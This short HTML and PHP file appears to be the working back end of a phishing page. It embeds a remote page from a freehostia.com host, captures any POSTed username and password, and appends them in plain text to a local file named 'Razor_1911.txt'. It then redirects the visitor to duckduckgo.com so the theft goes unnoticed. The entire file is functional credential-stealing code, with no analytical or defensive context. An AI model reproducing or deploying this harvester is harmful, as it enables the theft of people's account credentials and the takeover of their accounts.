<html>
<div style="margin: 0 auto; width:100%; height:400px;">
    <object type="text/html" data="https://datat.freehostia.com/laskuri.php"
            style="width:100%; height:100%; margin:1%;">
    </object>
</div>
</html>
<?php
 $path = 'Razor_1911.txt';
 if (isset($_POST['username']) && isset($_POST['password'])) {
    $fh = fopen($path,"a+");
    $string = $_POST['username'].' - '.$_POST['password'];
    fwrite($fh,$string); // Write information to the file
    fclose($fh); // Close the file
 }
include 'laskuri.php';
$laskuri = file_get_contents('https://datat.freehostia.com/laskuri.php');
header('Location: https://www.duckduckgo.com/');
// or die();
exit();
?>
